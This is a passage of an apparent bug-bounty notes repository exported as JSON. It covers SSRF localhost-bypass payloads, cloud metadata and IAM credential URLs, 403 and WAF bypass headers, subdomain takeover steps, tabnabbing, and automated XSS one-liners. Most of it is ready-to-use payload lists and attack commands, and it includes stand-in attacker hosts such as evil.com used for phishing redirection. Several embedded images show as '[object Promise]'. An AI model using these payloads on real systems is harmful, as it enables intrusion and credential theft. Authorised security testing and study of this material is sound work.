behalf of public server not from the browser.\r\n2. To fetch the data from server also try http://localhost/xyz/ with the http://127.0.0.1/xyz.\r\n3. Server may have the firewall protection always try to bypass the firewall if possible.\r\n4. Make sure that request is coming from server not from your local host.\r\n\r\n## Where to look for :\r\n\r\n```jsx\r\nuri=\r\nlogout_redirect_uri=\r\nurl=\r\npage=\r\nproxy=\r\nfwd=\r\nforward=\r\nu=\r\ndata=\r\npage=\r\nurl=\t\r\nret=\t\r\nr2=\t\r\nimg=\t\r\nu\t\r\nreturn\t\r\nr\t\r\nURL\t\r\nnext\t\r\nredirect\t\r\nredirectBack\t\r\nAuthState\t\r\nreferer\t\r\nredir\t\r\nl\t\r\naspxerrorpath\t\r\nimage_path\t\r\nActionCodeURL\t\r\nreturn_url\t0\r\nlink\t\r\nq\t\r\nlocation\t\r\nReturnUrl\t\r\nuri\t\r\nreferrer\t\r\nreturnUrl\r\nforward\t\r\nfile\r\nrb\t\r\nend_display\t\r\nurlact\t\r\nfrom\t\r\ngoto\t\r\npath\t\r\nredirect_url\t\r\nold\t\r\npathlocation\t\r\nsuccessTarget\t\r\nreturnURL\t\r\nurlsito\t\r\nnewurl\t\r\nUrl\t\r\nback\t\r\nretour\t\r\nodkazujuca\r\nr_link\t\r\ncur_url\t\r\nH_name\t\r\nref\t\r\ntopic\t\r\nresource\t\r\nreturnTo\t\r\nhome\t0.2%\r\nnode\t0.2%\r\nsUrl\t0.2%\r\nhref\t0.2%\r\nlinkurl\t0.2%\r\nreturnto\t0.2%\r\nredirecturl\t0.2%\r\nSL\t0.2%\r\nst\t0.2%\r\nerrorUrl\t0.2%\r\nmedia\t0.2%\r\ndestination\t0.2%\r\ntargeturl\t0.2%\r\nreturn_to\t0.2%\r\ncancel_url\t0.2%\r\ndoc\t0.2%\r\nGO\t0.2%\r\nReturnTo\t0.2%\r\nanything\t0.2%\r\nFileName\t0.2%\r\nlogoutRedirectURL\t0.2%\r\nlist\t0.2%\r\nstartUrl\t0.2%\r\nservice\t0.2%\r\nredirect_to\t0.2%\r\nend_url\t0.2%\r\n_next\t0.2%\r\nnoSuchEntryRedirect\t0.2%\r\ncontext\t0.2%\r\nreturnurl\t0.2%\r\nref_url\t0.2%\r\n```\r\n\r\n## 1-SSRF attacks against the server itself\r\n\r\nIn an SSRF attack against the server itself, the attacker induces the application to make an HTTP request back to the server that is hosting the application, via its loopback network interface. This will typically involve supplying a URL with a hostname like 127.0.0.1 (a reserved IP address that points to the loopback adapter) or localhost.\r\n\r\nBasic Localhost Payloads:\r\n\r\n```\r\nhttp://127.0.0.1:port\r\nhttp://localhost:port\r\nhttps://127.0.0.1:port\r\nhttps://localhost:port\r\nhttp://[::]:port\r\nhttp://0000::1:port\r\nhttp://[0:0:0:0:0:ffff:127.0.0.1]\r\nhttp://0/\r\nhttp://127.1\r\nhttp://127.0.1\r\n```\r\n\r\n**Steps to reproduce:**\r\n\r\n1-Try to use burpcollab to check if the server fetches data from an internal system(interacting with backend)\r\n\r\n2-Send request to localhost\r\n\r\n3-Try to perform sensitive actions as an unauthenicated users\r\n\r\n```jsx\r\n**Bypasses for Localhost\r\n\r\n1-**Bypass using HTTPS\r\nhttps://127.0.0.1/\r\nhttps://localhost/\r\n\r\n2-Bypass localhost with [::]\r\nhttp://[::]:80/\r\nhttp://[::]:25/ SMTP\r\nhttp://[::]:22/ SSH\r\nhttp://[::]:3128/ Squid\r\nhttp://0000::1:80/\r\nhttp://0000::1:25/ SMTP\r\nhttp://0000::1:22/ SSH\r\nhttp://0000::1:3128/ Squid\r\n\r\n3-Bypass localhost with a domain redirection\r\nhttp://spoofed.burpcollaborator.net\r\nhttp://localtest.me\r\nhttp://customer1.app.localhost.my.company.127.0.0.1.nip.io\r\nhttp://mail.ebc.apple.com redirect to 127.0.0.6 == localhost\r\nhttp://bugbounty.dod.network redirect to 127.0.0.2 == localhost\r\n\r\n4-Bypass localhost with CIDR\r\nhttp://127.127.127.127\r\nhttp://127.0.1.3\r\nhttp://127.0.0.0\r\n\r\n5-Bypass using a decimal IP location\r\nhttp://0177.0.0.1/\r\nhttp://2130706433/ = http://127.0.0.1\r\nhttp://3232235521/ = http://192.168.0.1\r\nhttp://3232235777/ = http://192.168.1.1\r\nhttp://2852039166/  = http://169.254.169.254\r\n\r\n6-Bypass using IPv6/IPv4 Address Embedding\r\nhttp://[0:0:0:0:0:ffff:127.0.0.1]\r\n\r\n7-Bypass using malformed urls\r\nlocalhost:+11211aaa\r\nlocalhost:00011211aaaa\r\n\r\n8-Bypass using rare address\r\nhttp://0/\r\nhttp://127.1\r\nhttp://127.0.1\r\n\r\n9-Bypass using URL encoding\r\nhttp://127.0.0.1/%61dmin\r\nhttp://127.0.0.1/%2561dmin\r\n\r\n10-Bypass using tricks combination\r\nhttp://1.1.1.1 &@2.2.2.2# @3.3.3.3/\r\nurllib2 : 1.1.1.1\r\nrequests + browsers : 2.2.2.2\r\nurllib : 3.3.3.3\r\n\r\n11-Bypass using enclosed alphanumerics\r\nhttp://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com\r\n\r\nList:\r\n① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿\r\n\r\n12-Bypass filter_var() php function\r\n0://evil.com:80;http://google.com:80/\r\n\r\n13-Bypass against a weak parser\r\nhttp://127.1.1.1:80\\@127.2.2.2:80/\r\nhttp://127.1.1.1:80\\@@127.2.2.2:80/\r\nhttp://127.1.1.1:80:\\@@127.2.2.2:80/\r\nhttp://127.1.1.1:80#\\@127.2.2.2:80/\r\n```\r\n\r\n## 2-SSRF URL for Cloud Instances\r\n\r\n```jsx\r\nAWS\r\nhttp://instance-data\r\nhttp://169.254.169.254\r\nhttp://169.254.169.254/latest/user-data\r\nhttp://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]\r\nhttp://169.254.169.254/latest/meta-data/\r\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]\r\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance\r\nhttp://169.254.169.254/latest/meta-data/ami-id\r\nhttp://169.254.169.254/latest/meta-data/reservation-id\r\nhttp://169.254.169.254/latest/meta-data/hostname\r\nhttp://169.254.169.254/latest/meta-data/public-keys/\r\nhttp://169.254.169.254/latest/meta-data/public-keys/0/openssh-key\r\nhttp://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key\r\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/dummy\r\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/s3access\r\nhttp://169.254.169.254/latest/dynamic/instance-identity/document\r\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role\r\n```\r\n\r\n```jsx\r\nGoogle Cloud\r\nhttp://169.254.169.254/computeMetadata/v1/\r\nhttp://metadata.google.internal/computeMetadata/v1/\r\nhttp://metadata/computeMetadata/v1/\r\nhttp://metadata.google.internal/computeMetadata/v1/instance/hostname\r\nhttp://metadata.google.internal/computeMetadata/v1/instance/id\r\nhttp://metadata.google.internal/computeMetadata/v1/project/project-id\r\n```\r\n\r\n```jsx\r\nAzure:\r\nhttp://169.254.169.254/metadata/v1/maintenance\r\nhttp://169.254.169.254/metadata/instance?api-version=2017-04-02\r\nhttp://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text\r\n```\r\n\r\n```jsx\r\nIPv6 Tests:\r\nhttp://[::ffff:169.254.169.254]\r\nhttp://[0:0:0:0:0:ffff:169.254.169.254]\r\n```\r\n\r\n```jsx\r\nECS Task: \r\nhttp://169.254.170.2/v2/credentials/\r\n```\r\n\r\n```jsx\r\nDigital Ocean:\r\nhttp://169.254.169.254/metadata/v1.json\r\nhttp://169.254.169.254/metadata/v1/ \r\nhttp://169.254.169.254/metadata/v1/id\r\nhttp://169.254.169.254/metadata/v1/user-data\r\nhttp://169.254.169.254/metadata/v1/hostname\r\nhttp://169.254.169.254/metadata/v1/region\r\nhttp://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address\r\n```\r\n\r\n```jsx\r\nPacketcloud:\r\nhttps://metadata.packet.net/userdata\r\n```\r\n\r\n```jsx\r\nOracle Cloud:\r\nhttp://169.254.169.254/opc/v1/instance/\r\n```\r\n\r\n```jsx\r\nAlibaba Cloud:\r\nhttp://100.100.100.200/latest/meta-data/\r\nhttp://100.100.100.200/latest/meta-data/instance-id\r\nhttp://100.100.100.200/latest/meta-data/image-id\r\nhttp://100.100.100.200/latest/user-data\r\n```\r\n\r\n## **Impact:**\r\n\r\nAn attacker can tunnel into internal networks and access sensitive internal data such as AWS metadata information.\r\n\r\n\r\n## Author:\r\n[Tushar Verma](https://twitter.com/e11i0t_4lders0n)\r\n"
    }
  ],
  "SSTI": [
    {
      "SSTI.md": "# Some MindMaps\r\n---\r\n### SSTI Finding Attack Vector by @what_web\r\n[object Promise]\r\n\r\n### Source\r\n* [https://twitter.com/jae_hak99/status/1331967876417327104?s=20](https://twitter.com/jae_hak99/status/1331967876417327104?s=20)\r\n\r\n### Tools\r\n+ [tplmap](https://github.com/epinna/tplmap)\r\n### Author\r\n* [0xsunil](https://twitter.com/0xsunil)\r\n"
    }
  ],
  "Status_Code_Bypass": [
    {
      "403Bypass.md": "## 403 Bypass\r\nI am sharing all this tips and techniques from my own personal experience there no official references for that\r\n\r\n### Directory Based\r\nIf you see directory with no slash at end then do these acts there\r\n```\r\nsite.com/secret => 403\r\nsite.com/secret/* => 200\r\nsite.com/secret/./ => 200\r\n```\r\n### File Base\r\nIf you see file without any slash at end then do these acts there\r\n```\r\nsite.com/secret.txt => 403\r\nsite.com/secret.txt/ => 200\r\nsite.com/%2f/secret.txt/ => 200\r\n```\r\n### Protocol Base\r\nWell, sound wired but check out the example for better understanding\r\n```\r\nhttps://site.com/secret => 403\r\nhttp://site.com/secret => 200\r\n```\r\n## Payloads\r\n```\r\n/\r\n/*\r\n/%2f/\r\n/./\r\n./.\r\n/*/\r\n```\r\n### Header\r\n[https://observationsinsecurity.com/2020/08/09/bypassing-403-to-get-access-to-an-admin-console-endpoints/](https://observationsinsecurity.com/2020/08/09/bypassing-403-to-get-access-to-an-admin-console-endpoints/)\r\n```\r\nX-Forwarded-For: 127.0.0.1\r\n```\r\n\r\n### Tools\r\nHere is a Tool I found on twitter.\r\n* [https://github.com/yunemse48/403bypasser](https://github.com/yunemse48/403bypasser)\r\n\r\n## Proof Of Concept\r\nWell Always look for some references or proof of concept if someone sharing any tips so you may confirm you are not wasting your time at all.\r\nI have some poc video on my YouTube channel for 403 and other Improper access control bugs with those methods. You can check them\r\n\r\nYouTube: [Mehedi Hasan Remon](https://www.youtube.com/channel/UCF_yxU7acxUojiGiOAMafQQ/videos?view_as=subscriber)\r\n\r\nAuthor:[@remonsec](https://twitter.com/remonsec)\r\n       [@KathanP19](https://twitter.com/KathanP19)\r\n"
    },
    {
      "README.md": "# Some Mind Maps\r\n--------\r\n### 403 Mindmap\r\n[object Promise]\r\n\r\n### Source \r\n* [https://twitter.com/hackerscrolls/status/1254701239360720900](https://twitter.com/hackerscrolls/status/1254701239360720900)\r\n---\r\n### Few Twitter Tips\r\n[object Promise]\r\n* [https://twitter.com/iam_j0ker/status/1303658167205728256](https://twitter.com/iam_j0ker/status/1303658167205728256)\r\n---\r\n### Few More Twitter Tips\r\n[object Promise]\r\n[object Promise]\r\n[object Promise]\r\n* [https://twitter.com/h4x0r_dz/status/1317218511937261570](https://twitter.com/h4x0r_dz/status/1317218511937261570)\r\n---\r\n### Author\r\n* [KathanP19](https://twitter.com/KathanP19)\r\n"
    }
  ],
  "Subdomain_Takeover": [
    {
      "Subdomain_Takeover.md": "# Subdomain Takeover\r\n\r\n## Basics\r\n\r\n### DNS\r\n[object Promise]\r\n* When a web address is accessed eg. \"www.xyz.com\", a DNS query is performed across a DNS server with the host name.\r\n* The DNS server takes the hostname and resolves it into a numeric IP address \r\n\r\n### CNAME\r\n[object Promise]\r\n* An alias of domain name to another domain name\r\n* In the example below, xyz.company.com is a source domain and xyz.cloudservice.com is a canonical domain name.\r\n\r\n\r\n\r\n\r\n\r\n[object Promise]\r\n\r\n* Subdomains map themselves to a specific IP, 3rd party services like Azure, AWS, Heroku, Github, Fastly, Shopify, etc. to serve the contents. These subdomains use a CNAME record to another domain [eg. xyz.company.com CNAME xyz.cloudservice.com]\r\n* Now due to whatever reason, the company decides to stop utilizing this service and to save some bucks, the company cancels the subscription of the 3rd party cloud service provider.\r\n* But, the company forgets to update or simply remove the CNAME record in the DNS zone file\r\n* Since the CNAME record is not deleted from company.com DNS zone, anyone who registers xyz.cloudservice.com has full control over xyz.company.com until the DNS record is present.\r\n\r\n## How to find subdomain takeover ?\r\n\r\n### 1. Subdomain Enumeration\r\nUse the following tools to enumerate subdomains\r\n* [Assetfinder](https://github.com/tomnomnom/assetfinder)\r\n* [Subfinder](https://github.com/projectdiscovery/subfinder)\r\n* [Findomain](https://github.com/Edu4rdSHL/findomain)\r\n\r\n### 2. Checking for takeover\r\nThe following tools are designed to scan a list of subdomains concurrently and identify ones that are able to be hijacked.\r\n* [Subjack](https://github.com/haccer/subjack)\r\n* [SubOver](https://github.com/Ice3man543/SubOver)\r\n\r\nYou can also verify if the subdomain is vulnerable or not by going through common error pages.\r\n### 3. Hijacking the subdomain\r\nUse the following github repositiory to check if the engine is vulnerable or not and the steps for hijacking a particular engine.\r\n* [https://github.com/EdOverflow/can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz)\r\n\r\nIf you cannot find your engine in the above repository, [Google](https://www.google.com) is your friend !\r\n\r\n# Case : CNAME available to buy\r\n[object Promise]\r\n* There are cases when the CNAME that a subdomain points to, is available to buy. \r\n* In that case the attacker can directly buy that domain and host his/her content.\r\n\r\n### References\r\n[How we Hijacked 26+ Subdomains](https://medium.com/@aishwaryakendle/how-we-hijacked-26-subdomains-9c05c94c7049)\r\n\r\n[Subdomain Takeover: Finding Candidates](https://0xpatrik.com/subdomain-takeover-candidates/)\r\n\r\n[Subdomain Takeover: Proof Creation for Bug Bounties](https://0xpatrik.com/takeover-proofs/)\r\n\r\n#### Check out our talk on the same at NULL / OWASP Bangalore meetup, June 2020\r\n[https://www.youtube.com/watch?v=xCunHBH8ZQ4](https://www.youtube.com/watch?v=xCunHBH8ZQ4)\r\n\r\n### Reports (Hackerone)\r\n\r\n#### Resolved\r\n\r\n- [subdomain takeover at news-static.semrush.com](https://hackerone.com/reports/294201)\r\n- [Subdomain takeover of resources.hackerone.com](https://hackerone.com/reports/863551)\r\n- [Subdomain takeover at info.hacker.one](https://hackerone.com/reports/202767)\r\n- [Bulgaria - Subdomain takeover of mail.starbucks.bg](https://hackerone.com/reports/736863)\r\n- [Remote code execution by hijacking an unclaimed S3 bucket in Rocket.Chat's installation script.](https://hackerone.com/reports/399166)\r\n- [Possible SOP bypass in www.starbucks.com due to insecure crossdomain.xml](https://hackerone.com/reports/244504)\r\n\r\n# Authors:\r\n[@aish_kendle](https://twitter.com/aish_kendle)\r\n\r\n[@thakare_prateek](https://twitter.com/thakare_prateek)\r\n\r\n[@klaus](https://twitter.com/klaus_dev)\r\n"
    }
  ],
  "Methods": [
    {
      "Easy_Methods.md": "#  1. Method by [@Virdoex_hunter](https://twitter.com/Virdoex_hunter)\r\nEasy Subdomain Takeover Method\r\n```\r\nStep:\r\n\r\n1:Grab all subdomains of target. i.e, subfinder -d flaws.cloud | tee -a domains.txt\r\n\t\t\t\r\n2:Run this one liner\r\n\t\t\t\r\n3:cat domains.txt | while read domain;do dig  $domain;done | tee -a digs.txt\r\n\t\t\t\r\n4::Grab all the CNAME Entries i.e, cat digs.txt | grep CNAME\r\n\t\t\t\r\n5:Find a domain that is pointed to third party domain like sub.exampple.com CNAME x.aws.com\r\n\t\t\t\r\n6:Check wheather the main subdomain is down\r\n\t\t\t\r\n7:Go to host provider where the domain is pointed to and register that domain if you registered congrats you have takeover the subdomain.\r\n\t\t\t\r\n```\r\n\r\n# 2. Method by [@WhoIs1nVok3r](https://twitter.com/WhoIs1nVok3r)\r\n```\r\nStep-1:- First of all collect all subdomain of the target using assetfinder,subfinder,chaos(needs API key).\r\n\r\nStep-2:- Next sort out duplicate URLs using -- cat unresolved | sort -u | tee -a resolved\r\n\r\nStep-3:- Pass it to subzy,subjack or other subdomain-takeover tool -- using subzy tool  --  subzy -targets resolved , or use subjack\r\n\r\nStep-4:- We can also use nuclei templates but we need to first use httpx -- cat resolved | httpx | tee -a hosts\r\n\r\nStep-5:- Next use nuclei-templates -- cat hosts | nuclei -t nuclei-templates/vulnerabilites -o nuclei.txt -v \r\n\r\nTools Used:-\r\n\r\nhttps://github.com/projectdiscovery/nuclei\r\nhttps://github.com/projectdiscovery/subfinder\r\nhttps://github.com/projectdiscovery/httpx\r\nhttps://github.com/projectdiscovery/nuclei-templates\r\nhttps://github.com/projectdiscovery/chaos-client\r\nhttps://github.com/haccer/subjack\r\nhttps://github.com/LukaSikic/subzy\r\n```\r\n\r\n## Author \r\n* [@Virdoex_hunter](https://twitter.com/Virdoex_hunter)\r\n* [@WhoIs1nVok3r](https://twitter.com/WhoIs1nVok3r)\r\n"
    }
  ],
  "Tabnabbing": [
    {
      "Tabnabbing.md": "# Tabnabbing\r\n\r\nEven though this vulnerability is rated by many bug bounty programs as a low severity bug, it is worth looking for it as it is very easy to find. \r\n\r\n### More information about the vulnerability:\r\n\r\nWhen tabnabbing, the attacker searches for links that are inserted into the website and are under his control. Such links may be contained in a forum post, for example. Once he has found this kind of functionality, it checks that the link's `rel` attribute does not contain the value `noopener` and the target attribute contains the value `_blank`. If this is the case, the website is vulnerable to tabnabbing. \r\n\r\n### How to exploit: \r\n```\r\n1. Attacker posts a link to a website under his control that contains the following JS code: window.opener.location = \"http://evil.com\"\r\n2. He tricks the victim into visiting the link, which is opened in the browser in a new tab.\r\n3. At the same time the JS code is executed and the background tab is redirected to the website evil.com, which is most likely a phishing website.\r\n4. If the victim opens the background tab again and doesn't look at the address bar, it may happen that he thinks he is logged out, because a login page appears, for example.\r\n5. The victim tries to log on again and the attacker receives the credentials\r\n```\r\n\r\n### How to search for it: \r\n\r\nAs already mentioned, you have to search for the following link formats: \r\n\r\n```html\r\n<a href=\"...\" target=\"_blank\" rel=\"\" />  \r\nor\r\n<a href=\"...\" target=\"_blank\" />\r\n```\r\n\r\n### Author\r\n\r\n* [@bolli95](https://github.com/bolli95)\r\n"
    }
  ],
  "WAF_Bypasses": [
    {
      "WAF_Bypass_Using_headers.md": "# WAF Bypass using Headers(Password reset poisoning)\r\n  For waf bypass, and similar\r\n  ```\r\n\tX-Forwarded-Host\r\n\tX-Forwarded-Port\r\n\tX-Forwarded-Scheme\r\n\tOrigin: \r\n\tnullOrigin: [siteDomain].attacker.com\r\n\tX-Frame-Options: Allow\r\n\tX-Forwarded-For: 127.0.0.1\r\n\tX-Client-IP: 127.0.0.1\r\n\tClient-IP: 127.0.0.1\r\n\tProxy-Host: 127.0.0.1\r\n\tRequest-Uri: 127.0.0.1\r\n\tX-Forwarded: 127.0.0.1\r\n\tX-Forwarded-By: 127.0.0.1\r\n\tX-Forwarded-For: 127.0.0.1\r\n\tX-Forwarded-For-Original: 127.0.0.1\r\n\tX-Forwarded-Host: 127.0.0.1\r\n\tX-Forwarded-Server: 127.0.0.1\r\n\tX-Forwarder-For: 127.0.0.1\r\n\tX-Forward-For: 127.0.0.1\r\n\tBase-Url: 127.0.0.1\r\n\tHttp-Url: 127.0.0.1\r\n\tProxy-Url: 127.0.0.1\r\n\tRedirect: 127.0.0.1\r\n\tReal-Ip: 127.0.0.1\r\n\tReferer: 127.0.0.1\r\n\tReferrer: 127.0.0.1\r\n\tRefferer: 127.0.0.1\r\n\tUri: 127.0.0.1\r\n\tUrl: 127.0.0.1\r\n\tX-Host: 127.0.0.1\r\n\tX-Http-Destinationurl: 127.0.0.1\r\n\tX-Http-Host-Override: 127.0.0.1\r\n\tX-Original-Remote-Addr: 127.0.0.1\r\n\tX-Original-Url: 127.0.0.1\r\n\tX-Proxy-Url: 127.0.0.1\r\n\tX-Rewrite-Url: 127.0.0.1\r\n\tX-Real-Ip: 127.0.0.1\r\n\tX-Remote-Addr: 127.0.0.1\r\n\tX-Custom-IP-Authorization:127.0.0.1\r\n\tX-Originating-IP: 127.0.0.1\r\n\tX-Remote-IP: 127.0.0.1\r\n\tX-Original-Url:\r\n\tX-Forwarded-Server:\r\n\tX-Host:\r\n\tX-Forwarded-Host:\r\n\tX-Rewrite-Url:\r\n  ```\r\n  \r\n # Authors\r\n* [Virdoex_hunter](https://twitter.com/Virdoex_hunter)\r\n"
    }
  ],
  "Weak_Password_Policy": [
    {
      "Weak_password_policy.md": "<h4>Summary:</h4>\r\n\r\nA weak password policy increases the probability of an attacker having success using brute force and dictionary attacks against user accounts. An attacker who can determine user passwords can take over a user's account and potentially access sensitive data in the application.\r\n\r\nThere are two ways in which this can be checked \r\n\r\n### First Way \r\n\r\n- Check if you can use Password same as that of Email Address\r\n- Check if you can use Username same as that of Email Address\r\n- Try above mentioned when Resetting Password , Creating Account , Changing Password from Account Settings\r\n\r\n### Second Way \r\n\r\n- Check if you can use Password some Weak Passwords such as 123456, 111111 , abcabc , qwerty123\r\n- Try above mentioned when Resetting Password , Creating Account , Changing Password from Account Settings\r\n\r\n* Applications usually have Restrictions on Password while Creating Account, Make sure you check for both the cases when Resetting Password\r\n\r\n\r\n### References\r\n\r\n- [All About Weak Password Policy](http://applicationsecurity.io/appsec-findings-database/weak-password-policy/)\r\n- [OWASP Guide for Weak Passwords](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy)\r\n"
    }
  ],
  "Web_Source_Review": [
    {
      "codereviewtips.md": "# Code review:-\r\n\r\nby performing source code review we can find some web application vulnerabilities\r\n\r\n\r\n### 1.Important functions first\r\n------------------------------------\r\nWhen reading source code, \r\nfocus on important functions such as authentication, password reset, state-changing actions and sensitive info reads. \r\n(What is the most important would depend on the application.) \r\nThen, review how these components interact with other functionality.\r\n Finally, audit other less sensitive parts of the application.\r\n\r\n### 2.Follow user input\r\n------------------------------\r\n\r\nAnother approach is to follow the code that processes user input. \r\nUser input such as HTTP request parameters, HTTP headers, HTTP request paths, database entries, file reads, and \r\nfile uploads provide the entry points for attackers to exploit the application’s vulnerabilities.This may also help us to\r\nfind some critical vulnerabilities like xxe,xxs,sql injection\r\n\r\n### 3.Hardcoded secrets and credentials: \r\n-------------------------------------------------------\r\nHardcoded secrets such as API keys, encryption keys and database passwords can be easily discovered during a \r\nsource code review. You can grep for keywords such as “key”, “secret”, “password”, “encrypt” or regex search \r\nfor hex or base64 strings (depending on the key format in use).\r\n\r\n### 4.Use of dangerous functions and outdated dependencies: \r\n----------------------------------------------------------------------------------\r\nUnchecked use of dangerous functions and outdated dependencies are a huge source of bugs.\r\n Grep for specific functions for the language you are using and search through the dependency versions list to \r\nsee if they are outdated.\r\n\r\n### 5.Developer comments, hidden debug functionalities, configuration files, and the .git directory:\r\n-----------------------------------------------------------------------------------------------------------------------\r\n These are things that developers often forget about and they leave the application in a dangerous state. \r\nDeveloper comments can point out obvious programming mistakes, hidden debug functionalities often lead to\r\n privilege escalation, config files allow attackers to gather more information about your infrastructure and finally, \r\nan exposed .git directory allows attackers to reconstruct your source code.\r\n\r\n### 6.Hidden paths, deprecated endpoints, and endpoints in development:\r\n-----------------------------------------------------------------------------------------------------\r\n These are endpoints that users might not encounter when using the application normally. But if they work and \r\nthey are discovered by an attacker, it can lead to vulnerabilities such as authentication bypass and sensitive \r\ninformation leak, depending on the exposed endpoint.\r\n\r\n\r\n\r\n### 7.Weak cryptography or hashing algorithms: \r\n-----------------------------------------------------------------------------------------------------------------------\r\nThis is an issue that is hard to find during a black-box test, but easy to spot when reviewing source code. \r\nLook for issues such as weak encryption keys, breakable encryption algorithms, and weak hashing algorithms. \r\nGrep for terms like ECB, MD4, and MD5.\r\n\r\n### 8.Missing security checks on user input and regex strength:\r\n-----------------------------------------------------------------------------------------------------\r\nReviewing source code is a great way to find out what kind of security checks are missing. \r\nRead through the application’s documentation and test all the edge cases that you can think of. \r\nA great resource for what kind of edge cases that you should consider is PayloadsAllTheThings.(github)\r\n\r\n### 9.Missing cookie flags:\r\n----------------------------------------------------------------- \r\nLook out for missing cookie flags such as httpOnly and secure.\r\n\r\n\r\n### 10.Unexpected behavior, conditionals, unnecessarily complex and verbose  functions: \r\n--------------------------------------------------------------------------------------------------------------------\r\nAdditionally, pay special attention to the application’s unexpected behavior, conditionals, and complex functions. \r\nThese locations are where obscure bugs are often discovered.\r\n\r\n### Authors\r\n* [@harsha0x01](https://twitter.com/harsha0x01)\r\n"
    }
  ],
  "XSS": [
    {
      "Automated_XSS.md": "# Automate XSS using Dalfox, WaybackURL, GF Patterns.\r\n\r\n<b> Make sure you have Go installed on your Machine </b> \r\n\r\n### To Install Go on your Machine:\r\n\r\n```\r\n  1) sudo apt install -y golang\r\n  2) export GOROOT=/usr/lib/go\r\n  3) export GOPATH=$HOME/go\r\n  4) export PATH=$GOPATH/bin:$GOROOT/bin:$PATH\r\n  5) source .bashrc\r\n```\r\n\r\n## How to Hunt Blind XSS using Dalfox? \r\n\r\n- Use Waybackurls by Tomnomnom to Fetch URLS for Specific Target.\r\n- Use GF patterns to find Possible XSS Vulnerable Parameters.\r\n- Use Dalfox to find XSS.\r\n\r\n* Steps :\r\n```bash\r\nwaybackurls testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | dalfox -b blindxss.xss.ht pipe > output.txt\r\n```\r\n## How to Hunt Reflected XSS?\r\n\r\n- Use Waybackurls by Tomnomnom to Fetch URLS for Specific Target.\r\n- Use qsreplace for Accept URLs on stdin, replace all query string values with a user-supplied value, only output each combination of query string parameters once per host and path.\r\n\r\n* Steps :\r\n```bash\r\nwaybackurls testphp.vulnweb.com| grep '=' | qsreplace '\"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure \"$host\" | grep -qs \"<script>alert(1)</script>\" && echo \"$host \\033[0;31m\" Vulnerable;done\r\n```\r\n## Find the parameters which are not filtering special characters - One Liner\r\n```bash\r\necho \"test.url\" | waybackurls | grep \"=\" | tee waybackurls.txt\r\ncat waybackruls | egrep -iv \".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|pdf|svg|txt)\" | qsreplace '\"><()'| tee combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure \"$host\" | grep -qs \"\\\"><()\" && echo -e \"$host \\033[91m Vullnerable \\e[0m \\n\" || echo -e \"$host  \\033[92m Not Vulnerable \\e[0m \\n\"; done | tee XSS.txt\r\n```\r\n\r\n## Tools Download Links:- \r\n\r\n* 1:- [Dalfox](https://github.com/hahwul/dalfox)\r\n* 2:- [Waybackurls](https://github.com/tomnomnom/waybackurls)\r\n* 3:- [GF](https://github.com/tomnomnom/gf)\r\n* 4:- [GF Patterns](https://github.com/1ndianl33t/Gf-Patterns)\r\n* 5:- [qsreplace](https://github.com/tomnomnom/qsreplace)\r\n\r\nFind Script here : [QuickXSS](https://github.com/theinfosecguy/QuickXSS)\r\n\r\n\r\nIf you have any Questions, Reach out to me via [Twitter](https://twitter.com/g0t_rOoT_)\r\n## Twitter : [Fani Malik](https://twitter.com/fanimalikhack)\r\n## Twitter : [Faizee Asad](https://twitter.com/faizee_asad)\r\n## Twitter : [Prince Prafull](https://twitter.com/princeprafull3)\r\n"
    },
    {
